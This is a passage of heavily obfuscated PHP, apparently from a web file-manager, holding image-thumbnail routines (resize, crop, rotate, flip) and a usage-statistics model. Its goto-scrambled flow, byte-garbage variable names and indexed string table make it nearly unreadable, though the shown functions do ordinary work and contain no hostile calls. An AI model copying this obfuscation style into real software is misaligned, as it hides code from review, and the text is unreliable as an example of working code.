$b•ä—™óôÂ = -(~$b•ä—™óôÂ & 4294967295) - 1; } if ($c ¼©Ó«…â & 2147483648) { $c ¼©Ó«…â = -(~$c ¼©Ó«…â & 4294967295) - 1; } if ($EÑˆ¶æñ¡ì & 2147483648) { $EÑˆ¶æñ¡ì = -(~$EÑˆ¶æñ¡ì & 4294967295) - 1; } goto c­‰áì˜È°; c­‰áì˜È°: if ($dµ‰Ñ»Ë & 2147483648) { $dµ‰Ñ»Ë = -(~$dµ‰Ñ»Ë & 4294967295) - 1; } if ($dÔ¯“«åµ­[$B¥ªÛÙÚÛã[520]] != 0) { $e¨Ï†»“ = $AÔÈ¤ÑÇ„ø == 1 || $AÔÈ¤ÑÇ„ø == 4 || $AÔÈ¤ÑÇ„ø == 8 ? ($Fè¿‰ºù« ? $Fè¿‰ºù« : pow(2, $AÔÈ¤ÑÇ„ø)) << 2 : 0; $AõÊ°šÓÜÍ = $F­‚¡˜æ ? $F­‚¡˜æ : ($b•ä—™óôÂ * $AÔÈ¤ÑÇ„ø + 31 >> 3 & ~3) * abs($c ¼©Ó«…â); $a†›·Ïß×ô = $dÔ¯“«åµ­[$B¥ªÛÙÚÛã[520]] - $AõÊ°šÓÜÍ - $e¨Ï†»“ - 14; if ($bâ¤ÈÎ¦‹¨ < $a†›·Ïß×ô && 40 <= $bâ¤ÈÎ¦‹¨ && $bâ¤ÈÎ¦‹¨ <= 124) { $bâ¤ÈÎ¦‹¨ = $a†›·Ïß×ô; } } if ($bâ¤ÈÎ¦‹¨ - 40 > 0) { $B¦¬¾Œ Ê› = fread($dÛÁ¡Ò¬ì, $bâ¤ÈÎ¦‹¨ - 40); if ($B¦¬¾Œ Ê› === !1) { return !1; } extract(unpack($B¥ªÛÙÚÛã[1855] . $B¥ªÛÙÚÛã[1856] . $B¥ªÛÙÚÛã[1857] . $B¥ªÛÙÚÛã[1858], $B¦¬¾Œ Ê› . str_repeat($B¥ªÛÙÚÛã[1859], 120))); } else { $eËæáĞŒÍù = $A˜ÚÏÍÜÚÉ = $d²¸‰³²ø = $DïÓè¨º’£ = 0; } goto cÁ³èŞÄº¹; cÁ³èŞÄº¹: if (($AÔÈ¤ÑÇ„ø == 16 || $AÔÈ¤ÑÇ„ø == 24 || $AÔÈ¤ÑÇ„ø == 32) && $CŒ¤ñò­·¶ == 0 && $A˜ÚÏÍÜÚÉ == 0 && $d²¸‰³²ø == 0 && $DïÓè¨º’£ == 0) { switch ($AÔÈ¤ÑÇ„ø) { case 16: $A˜ÚÏÍÜÚÉ = 31744; $d²¸‰³²ø = 992; $DïÓè¨º’£ = 31; break; case 24: case 32: $A˜ÚÏÍÜÚÉ = 16711680; $d²¸‰³²ø = 65280; $DïÓè¨º’£ = 255; break; } } goto D „Ìš¤Óâ; D „Ìš¤Óâ: } } goto c¦ø’ã§œ§; fŠğ¥ÎöÒ¼: } } class ImageThumb { var $srcFile = ''; var $imgData = ''; var $echoType; var $im = ''; var $srcW = ''; var $srcH = ''; function __construct($b‹³Ä×À¿, $Fé™¶ Ã·…) { goto D™’­š«¡; e¾½î²Ó‰: $this->srcW = imageSX($this->im); $this->srcH = imageSY($this->im); return $this; goto eá¤§¿¼Ÿ³; D™’­š«¡: $this->srcFile = $b‹³Ä×À¿; $this->echoType = $Fé™¶ Ã·…; $this->im = self::image($b‹³Ä×À¿); goto E—‰¿ÓÖÀ; E—‰¿ÓÖÀ: if (!$this->im) { return !1; } $A©­¢µ’ç = $_SERVER[”Ì÷ñ­î¸][33]; $this->imgData = GetImageSize($b‹³Ä×À¿, $A©­¢µ’ç); goto e¾½î²Ó‰; eá¤§¿¼Ÿ³: } public static function image($fêØµµÚ†¸) { $C×¨Ô‰Ë¼„ =& $_SERVER[”Ì÷ñ­î¸]; $f£¿»£«Îê = $C×¨Ô‰Ë¼„[33]; $a‰³á…‹°õ = GetImageSize($fêØµµÚ†¸, $f£¿»£«Îê); $Fğ—®ğ§À¥ = !1; switch ($a‰³á…‹°õ[2]) { case IMAGETYPE_GIF: if (!function_exists($C×¨Ô‰Ë¼„[1866])) { break; } $Fğ—®ğ§À¥ = imagecreatefromgif($fêØµµÚ†¸); break; case IMAGETYPE_JPEG: if (!function_exists($C×¨Ô‰Ë¼„[1867])) { break; } $Fğ—®ğ§À¥ = imagecreatefromjpeg($fêØµµÚ†¸); break; case IMAGETYPE_PNG: if (!function_exists($C×¨Ô‰Ë¼„[1868])) { break; } $Fğ—®ğ§À¥ = @imagecreatefrompng($fêØµµÚ†¸); imagesavealpha($Fğ—®ğ§À¥, !0); break; case IMAGETYPE_XBM: $Fğ—®ğ§À¥ = imagecreatefromxbm($fêØµµÚ†¸); break; case IMAGETYPE_WBMP: $Fğ—®ğ§À¥ = imagecreatefromwbmp($fêØµµÚ†¸); break; case IMAGETYPE_BMP: $Fğ—®ğ§À¥ = imagecreatefrombmp($fêØµµÚ†¸); break; default: break; } return $Fğ—®ğ§À¥; } public static function imageSize($F»šÚŸ) { $fêõ®éöêó =& $_SERVER[”Ì÷ñ­î¸]; $E‘‚ÆïÛ = GetImageSize($F»šÚŸ); if (!$E‘‚ÆïÛ) { return !1; } return array($fêõ®éöêó[1869] => $E‘‚ÆïÛ[0], $fêõ®éöêó[1870] => $E‘‚ÆïÛ[1]); } function distortion($b®Ø‰Ã‹­, $C¬¾±âµ…¦, $EçíÕ à¥ï) { $e„›ªì‰°„ = $this->creatImage($this->im, $C¬¾±âµ…¦, $EçíÕ à¥ï, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($e„›ªì‰°„, $b®Ø‰Ã‹­); } function prorate($e£„àÎ¢øí, $eß—«åœ ›, $CÓ‹°Û¦İ´) { $fÖ‰Ëï«ôê = $eß—«åœ › / $CÓ‹°Û¦İ´; $Fõ´†èÌ¾… = $this->srcW / $this->srcH; if ($fÖ‰Ëï«ôê <= $Fõ´†èÌ¾…) { $eöùºÑµ“» = $eß—«åœ ›; $A…Éäğ“ŸÁ = $eöùºÑµ“» * ($this->srcH / $this->srcW); } else { $A…Éäğ“ŸÁ = $CÓ‹°Û¦İ´; $eöùºÑµ“» = $A…Éäğ“ŸÁ * ($this->srcW / $this->srcH); } if ($this->srcW > $eß—«åœ › || $this->srcH > $CÓ‹°Û¦İ´) { $bæÍÎªÏÛã = $this->creatImage($this->im, $eöùºÑµ“», $A…Éäğ“ŸÁ, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($bæÍÎªÏÛã, $e£„àÎ¢øí); } else { $bæÍÎªÏÛã = $this->creatImage($this->im, $this->srcW, $this->srcH, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($bæÍÎªÏÛã, $e£„àÎ¢øí); } } function cut($c–¦Ã‡¸²œ, $eìŒõáºÊ, $AÎø×·ºß·) { goto D¿ĞÊÅÔË‹; c¡©ëÏ¹á…: $eà³Âì÷ä = $this->creatImage($this->im, $fÃ‘ŞËç, $b„ä—ïÏ‹, 0, 0, 0, 0, $this->srcW, $this->srcH); $aÓˆƒ¨øç = $this->creatImage($eà³Âì÷ä, $eìŒõáºÊ, $AÎø×·ºß·, 0, 0, ($fÃ‘ŞËç - $eìŒõáºÊ) / 2, ($b„ä—ïÏ‹ - $AÎø×·ºß·) / 2, $eìŒõáºÊ, $AÎø×·ºß·); imageDestroy($eà³Âì÷ä); goto c¶é­ğ±Î; D¿ĞÊÅÔË‹: $f­Ò§õÍ‰è = $eìŒõáºÊ / $AÎø×·ºß·; $eñ»„¸‹ã = $this->srcW / $this->srcH; if ($f­Ò§õÍ‰è <= $eñ»„¸‹ã) { $b„ä—ïÏ‹ = $AÎø×·ºß·; $fÃ‘ŞËç = $b„ä—ïÏ‹ * ($this->srcW / $this->srcH); } else { $fÃ‘ŞËç = $eìŒõáºÊ; $b„ä—ïÏ‹ = $fÃ‘ŞËç * ($this->srcH / $this->srcW); } goto c¡©ëÏ¹á…; c¶é­ğ±Î: return $this->echoImage($aÓˆƒ¨øç, $c–¦Ã‡¸²œ); goto fè†°ÂíÇö; fè†°ÂíÇö: } function backFill($D´§‚é¢ÛÇ, $E£‹¤Ó„×ë, $bÒâèÊö÷, $fˆ‚‘é’Ş‡ = false, $eÑÉÍÏµ¾´ = 255, $f£õ¼èÑŠ† = 255, $Cä¨¯µóÈ— = 255) { goto dìÑ¯¹‡„; ašğ½Ë†œô: if ($fˆ‚‘é’Ş‡) { $BøÊêÉš®„ = imageColorTransparent($BÒÄ½ïÄÖ, $BøÊêÉš®„); $Fø²Ë¤¥  = $bÒâèÊö÷ - $FŠ¤Å¦Å’Î; } imageFilledRectangle($BÒÄ½ïÄÖ, 0, 0, $E£‹¤Ó„×ë, $bÒâèÊö÷, $BøÊêÉš®„); if ($this->srcW > $E£‹¤Ó„×ë || $this->srcH > $bÒâèÊö÷) { $e¬—õƒ½÷ù = $this->creatImage($this->im, $dª•£§Ä¥„, $FŠ¤Å¦Å’Î, 0, 0, 0, 0, $this->srcW, $this->srcH); if ($dª•£§Ä¥„ < $E£‹¤Ó„×ë) { imageCopy($BÒÄ½ïÄÖ, $e¬—õƒ½÷ù, ($E£‹¤Ó„×ë - $dª•£§Ä¥„) / 2, 0, 0, 0, $dª•£§Ä¥„, $FŠ¤Å¦Å’Î); } else { if ($FŠ¤Å¦Å’Î < $bÒâèÊö÷) { imageCopy($BÒÄ½ïÄÖ, $e¬—õƒ½÷ù, 0, $Fø²Ë¤¥ , 0, 0, $dª•£§Ä¥„, $FŠ¤Å¦Å’Î); } else { imageCopy($BÒÄ½ïÄÖ, $e¬—õƒ½÷ù, 0, 0, 0, 0, $dª•£§Ä¥„, $FŠ¤Å¦Å’Î); } } } else { imageCopyMerge($BÒÄ½ïÄÖ, $this->im, ($E£‹¤Ó„×ë - $dª•£§Ä¥„) / 2, $Fø²Ë¤¥ , 0, 0, $dª•£§Ä¥„, $FŠ¤Å¦Å’Î, 100); } goto F±ƒöÛ·Î„; eëŸ†íƒìó: if (function_exists($_SERVER[”Ì÷ñ­î¸][1871])) { @($BÒÄ½ïÄÖ = imageCreateTrueColor($E£‹¤Ó„×ë, $bÒâèÊö÷)); if (!$BÒÄ½ïÄÖ) { $BÒÄ½ïÄÖ = imageCreate($E£‹¤Ó„×ë, $bÒâèÊö÷); } } else { $BÒÄ½ïÄÖ = imageCreate($E£‹¤Ó„×ë, $bÒâèÊö÷); } $Fø²Ë¤¥  = ($bÒâèÊö÷ - $FŠ¤Å¦Å’Î) / 2; $BøÊêÉš®„ = imagecolorallocate($BÒÄ½ïÄÖ, $eÑÉÍÏµ¾´, $f£õ¼èÑŠ†, $Cä¨¯µóÈ—); goto ašğ½Ë†œô; dìÑ¯¹‡„: $a›éŸ³‰¹… = $E£‹¤Ó„×ë / $bÒâèÊö÷; $eÉ÷–í…Ô„ = $this->srcW / $this->srcH; if ($a›éŸ³‰¹… <= $eÉ÷–í…Ô„) { $dª•£§Ä¥„ = $E£‹¤Ó„×ë; $FŠ¤Å¦Å’Î = $dª•£§Ä¥„ * ($this->srcH / $this->srcW); } else { $FŠ¤Å¦Å’Î = $bÒâèÊö÷; $dª•£§Ä¥„ = $FŠ¤Å¦Å’Î * ($this->srcW / $this->srcH); } goto eëŸ†íƒìó; F±ƒöÛ·Î„: return $this->echoImage($BÒÄ½ïÄÖ, $D´§‚é¢ÛÇ); goto fõã‚¹ñƒ; fõã‚¹ñƒ: } function creatImage($Dˆ¥…ÕÄ‘ì, $C¬œÑÙ„“¬, $bÕƒ¿†„, $dİïÒøÃÉ†, $bí½Œ‡ñ¿–, $EèÁ”£ä‰, $DˆÅòÇÜ, $D‹ù¾Ôäâ, $B‘²ÒŠõĞî) { if (function_exists($_SERVER[”Ì÷ñ­î¸][1871])) { @($A±§¤‹¢»¿ = ImageCreateTrueColor($C¬œÑÙ„“¬, $bÕƒ¿†„)); @imagealphablending($A±§¤‹¢»¿, !1); @imagesavealpha($A±§¤‹¢»¿, !0); if ($A±§¤‹¢»¿) { imageCopyResampled($A±§¤‹¢»¿, $Dˆ¥…ÕÄ‘ì, $dİïÒøÃÉ†, $bí½Œ‡ñ¿–, $EèÁ”£ä‰, $DˆÅòÇÜ, $C¬œÑÙ„“¬, $bÕƒ¿†„, $D‹ù¾Ôäâ, $B‘²ÒŠõĞî); } else { $A±§¤‹¢»¿ = ImageCreate($C¬œÑÙ„“¬, $bÕƒ¿†„); imageCopyResized($A±§¤‹¢»¿, $Dˆ¥…ÕÄ‘ì, $dİïÒøÃÉ†, $bí½Œ‡ñ¿–, $EèÁ”£ä‰, $DˆÅòÇÜ, $C¬œÑÙ„“¬, $bÕƒ¿†„, $D‹ù¾Ôäâ, $B‘²ÒŠõĞî); } } else { $A±§¤‹¢»¿ = ImageCreate($C¬œÑÙ„“¬, $bÕƒ¿†„); imageCopyResized($A±§¤‹¢»¿, $Dˆ¥…ÕÄ‘ì, $dİïÒøÃÉ†, $bí½Œ‡ñ¿–, $EèÁ”£ä‰, $DˆÅòÇÜ, $C¬œÑÙ„“¬, $bÕƒ¿†„, $D‹ù¾Ôäâ, $B‘²ÒŠõĞî); } return $A±§¤‹¢»¿; } public function imgRotate($BàîËÏ¸Ñ¤, $c®ŞÙˆ) { goto a†É®Ì‹Ü“; a†É®Ì‹Ü“: if (!$this->im || $c®ŞÙˆ % 360 === 0 || !function_exists($_SERVER[”Ì÷ñ­î¸][1872])) { return !1; } $c©õ– áíğ = imageRotate($this->im, 360 - $c®ŞÙˆ, 0); $D¿¯Ìˆ„“ = !1; goto FÓêÁŞ×áÎ; FÓêÁŞ×áÎ: switch ($this->imgData[2]) { case IMAGETYPE_GIF: $D¿¯Ìˆ„“ = imagegif($c©õ– áíğ, $BàîËÏ¸Ñ¤); break; case IMAGETYPE_JPEG: $D¿¯Ìˆ„“ = imagejpeg($c©õ– áíğ, $BàîËÏ¸Ñ¤, 100); break; case IMAGETYPE_PNG: $D¿¯Ìˆ„“ = imagePNG($c©õ– áíğ, $BàîËÏ¸Ñ¤); break; default: break; } imageDestroy($c©õ– áíğ); imageDestroy($this->im); goto Fñ·ÄˆÊç; Fñ·ÄˆÊç: return $D¿¯Ìˆ„“; goto aÄÚŒÏ¨„Ğ; aÄÚŒÏ¨„Ğ: } function echoImage($FÀºçõÓ, $eìÇçä­å³) { goto aª‚ÃÁÜ›ª; CÒè­Ö›ÈÍ: $e™Ü§ê÷Ó = !1; switch ($this->echoType) { case $Aì¸ô¥›Ñ†[1873]: $e™Ü§ê÷Ó = imagePNG($FÀºçõÓ); break; case $Aì¸ô¥›Ñ†[167]: $e™Ü§ê÷Ó = imagePNG($FÀºçõÓ, $eìÇçä­å³); break; } imageDestroy($FÀºçõÓ); goto e†ÛÉœ¦«Ë; e†ÛÉœ¦«Ë: imageDestroy($this->im); return $e™Ü§ê÷Ó; goto b°„ÍöìöÀ; aª‚ÃÁÜ›ª: $Aì¸ô¥›Ñ† =& $_SERVER[”Ì÷ñ­î¸]; if (!$FÀºçõÓ) { return !1; } ob_get_clean(); goto CÒè­Ö›ÈÍ; b°„ÍöìöÀ: } } if (!function_exists($_SERVER[”Ì÷ñ­î¸][1874])) { define($_SERVER[”Ì÷ñ­î¸][1875], 0); define($_SERVER[”Ì÷ñ­î¸][1876], 1); define($_SERVER[”Ì÷ñ­î¸][1877], 2); function imageflip($FÏ¨ÛÏª÷ø, $EšØåÀÓŠø) { switch ($EšØåÀÓŠø) { case IMG_FLIP_HORIZONTAL: $bª¬¹¸Ì×¯ = imagesx($FÏ¨ÛÏª÷ø) - 1; $d¤“ŞŸÄÍó = $bª¬¹¸Ì×¯ / 2; $f•©‹¦– = imagesy($FÏ¨ÛÏª÷ø); $E´‘ñÑ§Ú½ = imageistruecolor($FÏ¨ÛÏª÷ø) ? imagecreatetruecolor(1, $f•©‹¦–) : imagecreate(1, $f•©‹¦–); for ($AÇ½Œ‰Şç = 0; $AÇ½Œ‰Şç < $d¤“ŞŸÄÍó; ++$AÇ½Œ‰Şç) { imagecopy($E´‘ñÑ§Ú½, $FÏ¨ÛÏª÷ø, 0, 0, $AÇ½Œ‰Şç, 0, 1, $f•©‹¦–); imagecopy($FÏ¨ÛÏª÷ø, $FÏ¨ÛÏª÷ø, $AÇ½Œ‰Şç, 0, $bª¬¹¸Ì×¯ - $AÇ½Œ‰Şç, 0, 1, $f•©‹¦–); imagecopy($FÏ¨ÛÏª÷ø, $E´‘ñÑ§Ú½, $bª¬¹¸Ì×¯ - $AÇ½Œ‰Şç, 0, 0, 0, 1, $f•©‹¦–); } break; case IMG_FLIP_VERTICAL: $DœäŒŞÈ…‘ = imagesx($FÏ¨ÛÏª÷ø); $e­…¶ŒÒë¸ = imagesy($FÏ¨ÛÏª÷ø) - 1; $Dñ’Ô›õÚ = $e­…¶ŒÒë¸ / 2; $E´‘ñÑ§Ú½ = imageistruecolor($FÏ¨ÛÏª÷ø) ? imagecreatetruecolor($DœäŒŞÈ…‘, 1) : imagecreate($DœäŒŞÈ…‘, 1); for ($DåÙÆÍâÑ‡ = 0; $DåÙÆÍâÑ‡ < $Dñ’Ô›õÚ; ++$DåÙÆÍâÑ‡) { imagecopy($E´‘ñÑ§Ú½, $FÏ¨ÛÏª÷ø, 0, 0, 0, $DåÙÆÍâÑ‡, $DœäŒŞÈ…‘, 1); imagecopy($FÏ¨ÛÏª÷ø, $FÏ¨ÛÏª÷ø, 0, $DåÙÆÍâÑ‡, 0, $e­…¶ŒÒë¸ - $DåÙÆÍâÑ‡, $DœäŒŞÈ…‘, 1); imagecopy($FÏ¨ÛÏª÷ø, $E´‘ñÑ§Ú½, 0, $e­…¶ŒÒë¸ - $DåÙÆÍâÑ‡, 0, 0, $DœäŒŞÈ…‘, 1); } break; case IMG_FLIP_BOTH: $DœäŒŞÈ…‘ = imagesx($FÏ¨ÛÏª÷ø); $f•©‹¦– = imagesy($FÏ¨ÛÏª÷ø); $E´‘ñÑ§Ú½ = imagerotate($FÏ¨ÛÏª÷ø, 180, 0); imagecopy($FÏ¨ÛÏª÷ø, $E´‘ñÑ§Ú½, 0, 0, 0, 0, $DœäŒŞÈ…‘, $f•©‹¦–); break; default: return; } imagedestroy($E´‘ñÑ§Ú½); } } goto F’©ëø¶¿±; aé¯ƒˆøÉ”: class ZipStream { } class AnalysisModel extends ModelBaseLight { public function init($Eò÷©¦°÷ì) { $E½Å¢òÒòÚ =& $_SERVER[”Ì÷ñ­î¸]; $a™óœ¹‡„ = array($E½Å¢òÒòÚ[535] => array($E½Å¢òÒòÚ[29] => $E½Å¢òÒòÚ[2032], $E½Å¢òÒòÚ[261] => array($E½Å¢òÒòÚ[210], $E½Å¢òÒòÚ[701], $E½Å¢òÒòÚ[2033], $E½Å¢òÒòÚ[2034])), $E½Å¢òÒòÚ[2035] => array($E½Å¢òÒòÚ[29] => $E½Å¢òÒòÚ[2036], $E½Å¢òÒòÚ[261] => array($E½Å¢òÒòÚ[210], $E½Å¢òÒòÚ[699], $E½Å¢òÒòÚ[2037], $E½Å¢òÒòÚ[2038], $E½Å¢òÒòÚ[2039]))); if (!isset($a™óœ¹‡„[$Eò÷©¦°÷ì])) { return !1; } $this->optionType = $a™óœ¹‡„[$Eò÷©¦°÷ì][$E½Å¢òÒòÚ[29]]; $this->field = $a™óœ¹‡„[$Eò÷©¦°÷ì][$E½Å¢òÒòÚ[261]]; return !0; } public function listData($BÑóâëíå‘ = false, $EÎêí´Ÿ£„ = "\155\x6f\x64\x69\146\x79\x54\x69\155\x65", $d¬¹ßéÜ³Ù = false) { return parent::listData($BÑóâëíå‘, $EÎêí´Ÿ£„, $d¬¹ßéÜ³Ù); } public function trendList($B¹¤ïšİÓ) { goto e§Èä…ÃÍ; eš²„ŠòÍ–: if (!isset($BâÅ‡ãéˆ)) { $eËŞ ”Ø = $B¹¤ïšİÓ == $c…ªÅĞ­´ä[535] ? $c…ªÅĞ­´ä[477] : $c…ªÅĞ­´ä[754]; $BâÅ‡ãéˆ = Model($eËŞ ”Ø)->min($c…ªÅĞ­´ä[187]); } $AÌÕí¼áòè = $c…ªÅĞ­´ä[2042] . ucfirst($B¹¤ïšİÓ); $CÕ‡ÕĞ·â£ = $this->dateList($BâÅ‡ãéˆ); goto Eï¹¨†èÆ; Eï¹¨†èÆ: foreach ($CÕ‡ÕĞ·â£ as $BğÔÏ­½¿·) { $this->{$AÌÕí¼áòè}($BğÔÏ­½¿·); } return $this->listData(); goto c°İ ŒÍ™¦; e§Èä…ÃÍ: $c…ªÅĞ­´ä =& $_SERVER[”Ì÷ñ­î¸]; $dÅÖ—°½Â = $this->listData(); if ($dÅÖ—°½Â) { $bƒˆ”Öœ® = end($dÅÖ—°½Â); $BğÔÏ­½¿· = date($c…ªÅĞ­´ä[2040], strtotime($c…ªÅĞ­´ä[2041])); if ($bƒˆ”Öœ®[$c…ªÅĞ­´ä[210]] == $BğÔÏ­½¿·) { return $dÅÖ—°½Â; } $BâÅ‡ãéˆ = strtotime($bƒˆ”Öœ®[$c…ªÅĞ­´ä[210]]); } goto eš²„ŠòÍ–; c°İ ŒÍ™¦: } private function dateList($DŠÄ˜Á†) { $cŸÏ©ƒÒ‡ =& $_SERVER[”Ì÷ñ­î¸]; $eœÆßù·Ù¾ = $DŠÄ˜Á†; $AöÑì–Å‹Ú = strtotime($cŸÏ©ƒÒ‡[2041]); $bæ‰íØÌ´ô = array(); while ($eœÆßù·Ù¾ <= $AöÑì–Å‹Ú) { $bæ‰íØÌ´ô[] = date($cŸÏ©ƒÒ‡[2040], $eœÆßù·Ù¾); $eœÆßù·Ù¾ = strtotime($cŸÏ©ƒÒ‡[2043], $eœÆßù·Ù¾); } return $bæ‰íØÌ´ô; } public function _recordUser($C¿«¯»•‰ = '') { goto cÀäç§É·Í; DÎ„¾ÄÃŒ´: $FÅ¢¾ôÛÖ¨ = Model($dİÈÈò[477])->where($CÒÎö®„»)->count($dİÈÈò[1439]); $CÒÎö®„»[$dİÈÈò[29]] = $dİÈÈò[2046]; $fªÅ¬¾îí· = Model($dİÈÈò[2047])->where($CÒÎö®„»)->count($dİÈÈò[2048]); goto F¿Ú¥‚¼ˆ; F¿Ú¥‚¼ˆ: $FÄ±ƒÓœÌº = array($dİÈÈò[210] => $C¿«¯»•‰, $dİÈÈò[701] => (int) $EîŸ¦¿óÓ†, $dİÈÈò[2033] => (int) $FÅ¢¾ôÛÖ¨, $dİÈÈò[2034] => (int) $fªÅ¬¾îí·); return $this->insert($FÄ±ƒÓœÌº); goto E¢ÁÕ™Ø‡é; B¶óèó•Ê‚: $CÒÎö®„» = array($dİÈÈò[187] => array($dİÈÈò[929], $eêÃ³µ²™ˆ)); $EîŸ¦¿óÓ† = Model($dİÈÈò[477])->where($CÒÎö®„»)->count($dİÈÈò[1439]); $CÒÎö®„»[$dİÈÈò[187]] = array($dİÈÈò[321], array($a©„Œš‹±©, $eêÃ³µ²™ˆ)); goto DÎ„¾ÄÃŒ´; cÀäç§É·Í: $dİÈÈò =& $_SERVER[”Ì÷ñ­î¸]; $a©„Œš‹±© = strtotime(date($dİÈÈò[2044], strtotime($C¿«¯»•‰))); $eêÃ³µ²™ˆ = strtotime(date($dİÈÈò[2045], strtotime($C¿«¯»•‰))); goto B¶óèó•Ê‚; E¢ÁÕ™Ø‡é: } public function _recordStore($c¹òè¼¸£± = '') { goto f´Á´ï¦Æ; f´Á´ï¦Æ: $C„†êÓœ˜ =& $_SERVER[”Ì÷ñ­î¸]; $aæÄîÍÎ±İ = strtotime(date($C„†êÓœ˜[2045], strtotime($c¹òè¼¸£±))); $AŸØ¿Òæ”ï = array($C„†êÓœ˜[187] => array($C„†êÓœ˜[929], $aæÄîÍÎ±İ)); goto DõÄÎæ‡; DõÄÎæ‡: $b½¤Œ¬×öÂ = Model($C„†êÓœ˜[422])->where($AŸØ¿Òæ”ï)->sum($C„†êÓœ˜[77]); $AŸØ¿Òæ”ï[$C„†êÓœ˜[370]] = 0; $AìÁá…ˆË = Model($C„†êÓœ˜[754])->where($AŸØ¿Òæ”ï)->sum($C„†êÓœ˜[77]); goto F•«Œ‚õÍ; B‘„¿¿‡„õ: $FÁ„£Åç…¶ = Model($C„†êÓœ˜[754])->where($AŸØ¿Òæ”ï)->sum($C„†êÓœ˜[77]); $AÔ…ùÏæÔ° = array($C„†êÓœ˜[210] => $c¹òè¼¸£±, $C„†êÓœ˜[699] => (int) $AìÁá…ˆË, $C„†êÓœ˜[2037] => (int) $b½¤Œ¬×öÂ, $C„†êÓœ˜[2038] => (int) $AØ‹êÔİİñ, $C„†êÓœ˜[2039] => (int) $FÁ„£Åç…¶); return $this->insert($AÔ…ùÏæÔ°); goto F“¸Üˆ²¹ˆ; F•«Œ‚õÍ: $AŸØ¿Òæ”ï[$C„†êÓœ˜[371]] = 1; $AØ‹êÔİİñ = Model($C„†êÓœ˜[754])->where($AŸØ¿Òæ”ï)->sum($C„†êÓœ˜[77]); $AŸØ¿Òæ”ï[$C„†êÓœ˜[371]] = 2; goto B‘„¿¿‡„õ; F“¸Üˆ²¹ˆ: } public function trend($aÑ¨„¶÷”‹, $F™¿·¾¯ª) { goto D‹îÀ¸ò¯Œ; B†ÕæªÃœš: if (empty($E×Á¥É)) { $cİº˜Á¶… = date($f¯ôáÇÆ’İ[2040], strtotime($f¯ôáÇÆ’İ[2041])); $Ašãäƒ×¡ = array($f¯ôáÇÆ’İ[210] => $cİº˜Á¶…); foreach ($d‘É´ÆÆ[$aÑ¨„¶÷”‹] as $A‹±æ³ì => $AŸĞ±ˆµ»à) { $Ašãäƒ×¡[$A‹±æ³ì] = 0; } $E×Á¥É[] = $Ašãäƒ×¡; } $cõ„ÄƒäÓÉ = array(); foreach ($E×Á¥É as $AŸĞ±ˆµ»à) { if ($aÑ¨„¶÷”‹ == $f¯ôáÇÆ’İ[2035] && $AŸĞ±ˆµ»à[$f¯ôáÇÆ’İ[2037]] > $AŸĞ±ˆµ»à[$f¯ôáÇÆ’İ[699]]) { $AŸĞ±ˆµ»à[$f¯ôáÇÆ’İ[2037]] = $AŸĞ±ˆµ»à[$f¯ôáÇÆ’İ[699]]; } foreach ($d‘É´ÆÆ[$aÑ¨„¶÷”‹] as $A‹±æ³ì => $d Ò¬©Í¦ñ) { $bùøèÑ¬©µ = array($f¯ôáÇÆ’İ[210] => $AŸĞ±ˆµ»à[$f¯ôáÇÆ’İ[210]], $f¯ôáÇÆ’İ[1344] => $d Ò¬©Í¦ñ); $bùøèÑ¬©µ[$d‘‘¶œ™Àã[$aÑ¨„¶÷”‹]] = isset($AŸĞ±ˆµ»à[$A‹±æ³ì]) ? $AŸĞ±ˆµ»à[$A‹±æ³ì] : 0; $cõ„ÄƒäÓÉ[] = $bùøèÑ¬©µ; } } goto BøÍÙ…Ôİ; BøÍÙ…Ôİ: return $cõ„ÄƒäÓÉ; goto E‡Æ’È¼™í; e¨…§¡©‰Õ: if ($E×Á¥É && $F™¿·¾¯ª != $f¯ôáÇÆ’İ[1414]) { $b–¸İÅ‘ƒ· = $E×Á¥É[0][$f¯ôáÇÆ’İ[210]]; $DÍ£´­Íµ¦ = $this->validDate($F™¿·¾¯ª, $b–¸İÅ‘ƒ·); $D‰¦‹ğí¹ = array(); $Dà¼“İ¼Ò = array_to_keyvalue($E×Á¥É, $f¯ôáÇÆ’İ[210]); foreach ($DÍ£´­Íµ¦ as $cİº˜Á¶…) { if (isset($Dà¼“İ¼Ò[$cİº˜Á¶…])) { $bùøèÑ¬©µ = $Dà¼“İ¼Ò[$cİº˜Á¶…]; } else { $bùøèÑ¬©µ = end($E×Á¥É); $bùøèÑ¬©µ[$f¯ôáÇÆ’İ[210]] = $cİº˜Á¶…; if ($aÑ¨„¶÷”‹ == $f¯ôáÇÆ’İ[535]) { $bùøèÑ¬©µ[$f¯ôáÇÆ’İ[2033]] = $bùøèÑ¬©µ[$f¯ôáÇÆ’İ[2034]] = 0; } } $D‰¦‹ğí¹[] = $bùøèÑ¬©µ; } $E×Á¥É = $D‰¦‹ğí¹; } $d‘É´ÆÆ = array($f¯ôáÇÆ’İ[535] => array($f¯ôáÇÆ’İ[701] => LNG($f¯ôáÇÆ’İ[2049]), $f¯ôáÇÆ’İ[2033] => LNG($f¯ôáÇÆ’İ[2050]), $f¯ôáÇÆ’İ[2034] => LNG($f¯ôáÇÆ’İ[2051])), $f¯ôáÇÆ’İ[2035] => array($f¯ôáÇÆ’İ[699] => LNG($f¯ôáÇÆ’İ[2052]), $f¯ôáÇÆ’İ[2037] => LNG($f¯ôáÇÆ’İ[2053]), $f¯ôáÇÆ’İ[2038] => LNG($f¯ôáÇÆ’İ[2054]), $f¯ôáÇÆ’İ[2039] => LNG($f¯ôáÇÆ’İ[2055]))); $d‘‘¶œ™Àã = array($f¯ôáÇÆ’İ[535] => $f¯ôáÇÆ’İ[2056], $f¯ôáÇÆ’İ[2035] => $f¯ôáÇÆ’İ[77]); goto B†ÕæªÃœš; D‹îÀ¸ò¯Œ: $f¯ôáÇÆ’İ =& $_SERVER[”Ì÷ñ­î¸]; if (!$this->init($aÑ¨„¶÷”‹)) { return !1; } $E×Á¥É = $this->trendList($aÑ¨„¶÷”‹); goto e¨…§¡©‰Õ; E‡Æ’È¼™í: } public function validDate($A·Áß×Š, $FÎ¨­‹º¡Ÿ) { goto c©­ŠÖî“; BØùùÕ ªˆ: switch ($A·Áß×Š) { case $CïÔŠ½‘˜Œ[1421]: $E„çâÒ…±Û = mktime(0, 0, 0, date($CïÔŠ½‘˜Œ[2057]), date($CïÔŠ½‘˜Œ[2058]) - date($CïÔŠ½‘˜Œ[1228]) + 7 - 7, date($CïÔŠ½‘˜Œ[2059])); $C‰“Ìò‘º  = 0; do { $F¡¡ƒÅ»Ùò = date($CïÔŠ½‘˜Œ[2040], 